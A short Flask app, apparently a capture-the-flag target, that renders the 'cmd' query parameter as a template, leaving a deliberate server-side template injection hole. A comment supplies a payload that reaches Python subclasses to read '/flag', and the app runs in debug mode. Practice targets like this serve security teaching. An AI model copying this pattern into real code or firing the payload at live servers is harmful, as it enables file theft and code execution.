from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    cmd = request.args.get('cmd', 'Hello, World!')
    return render_template_string(cmd)
# SSTI
# ''.__class__.__mro__[1].__subclasses__()[40]('/flag', 'r').read()
if __name__ == '__main__':
    app.run(debug=True)